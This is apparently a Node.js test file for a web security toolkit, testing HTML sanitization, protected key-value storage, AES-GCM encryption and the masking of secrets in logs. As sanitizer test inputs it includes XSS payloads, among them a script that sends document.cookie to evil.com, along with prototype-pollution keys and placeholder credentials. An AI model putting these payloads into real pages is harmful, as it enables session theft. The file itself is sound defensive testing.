import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import {
  escapeHtml,
  sanitizeHtml,
  safeHtml,
  createSecureStorage,
  encryptData,
  decryptData,
  maskSensitiveText,
} from '../src/security.js';

describe('Security Toolkit', () => {
  describe('HTML Escaping & Sanitization', () => {
    test('escapeHtml handles dangerous characters', () => {
      const raw = '<script>alert("XSS" & \'attack\');</script>';
      const escaped = escapeHtml(raw);
      assert.ok(!escaped.includes('<script>'));
      assert.ok(escaped.includes('&lt;script&gt;'));
      assert.ok(escaped.includes('&amp;'));
      assert.ok(escaped.includes('&#39;'));
    });

    test('sanitizeHtml strips script tags, iframes and inline event handlers', () => {
      const dirty = '<div onclick="stealTokens()">Hello <script>fetch("http://evil.com?c=" + document.cookie)</script><iframe src="javascript:alert(1)"></iframe>World</div>';
      const clean = sanitizeHtml(dirty);
      assert.ok(!clean.includes('onclick'));
      assert.ok(!clean.includes('<script'));
      assert.ok(!clean.includes('<iframe'));
      assert.ok(clean.includes('Hello'));
      assert.ok(clean.includes('World'));
    });

    test('safeHtml tagged template automatically escapes untrusted interpolations', () => {
      const untrustedUserInput = '<img src=x onerror=alert(1)>';
      const rendered = safeHtml`<div class="profile">User: ${untrustedUserInput}</div>`;
      assert.ok(!rendered.includes('<img'));
      assert.ok(rendered.includes('&lt;img'));
    });
  });

  describe('SecureStorage', () => {
    test('provides isolated namespaced key-value storage', async () => {
      const storage = createSecureStorage({ namespace: 'test_app', area: 'memory' });
      await storage.set('theme', 'dark');
      await storage.set('settings', { notifications: true, volume: 80 });

      assert.equal(await storage.get('theme'), 'dark');
      assert.deepEqual(await storage.get('settings'), { notifications: true, volume: 80 });
      assert.equal(await storage.get('non_existent', 'default_val'), 'default_val');

      await storage.remove('theme');
      assert.equal(await storage.get('theme'), null);

      await storage.clear();
      assert.equal(await storage.get('settings'), null);
    });

    test('rejects prototype pollution attempts', async () => {
      const storage = createSecureStorage({ area: 'memory' });
      await assert.rejects(
        async () => storage.set('__proto__', { admin: true }),
        /Prototype pollution attempt/
      );
      await assert.rejects(
        async () => storage.set('constructor', { evil: true }),
        /Prototype pollution attempt/
      );
    });

    test('AES-GCM encryption and decryption round-trip', async () => {
      const secret = 'super-secret-passphrase-1234!';
      const sensitivePayload = JSON.stringify({
        token: 'eyJhGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
        userId: 'user_482910',
        pin: 9482,
      });

      const encrypted = await encryptData(sensitivePayload, secret);
      assert.notEqual(encrypted, sensitivePayload);
      assert.equal(typeof encrypted, 'string');

      const decrypted = await decryptData(encrypted, secret);
      assert.equal(decrypted, sensitivePayload);
      assert.deepEqual(JSON.parse(decrypted), JSON.parse(sensitivePayload));
    });

    test('storage with encryptionKey automatically encrypts data', async () => {
      const storage = createSecureStorage({
        namespace: 'vault',
        area: 'memory',
        encryptionKey: 'my-strong-password',
      });

      await storage.set('apiKey', 'ht_live_93840293842039');
      const retrieved = await storage.get('apiKey');
      assert.equal(retrieved, 'ht_live_93840293842039');

      // Verify raw backend holds encrypted envelope
      const rawStored = storage.backend.map.get('_ht_vault_apiKey');
      assert.equal(rawStored.__encrypted, true);
      assert.ok(typeof rawStored.payload === 'string');
    });
  });

  describe('Sensitive Data Masking', () => {
    test('masks tokens, passwords and credit cards', () => {
      const log = 'User logged in with Bearer abcdef1234567890. API key: api_key=sk_live_123456. Card: 4111 2222 3333 4444. password: secretPassword!';
      const masked = maskSensitiveText(log);
      assert.ok(!masked.includes('abcdef1234567890'));
      assert.ok(!masked.includes('sk_live_123456'));
      assert.ok(!masked.includes('4111 2222 3333 4444'));
      assert.ok(!masked.includes('secretPassword!'));
      assert.ok(masked.includes('[MASKED_TOKEN]'));
      assert.ok(masked.includes('[MASKED_KEY]'));
      assert.ok(masked.includes('[MASKED_CARD]'));
      assert.ok(masked.includes('[MASKED_PASSWORD]'));
    });
  });
});
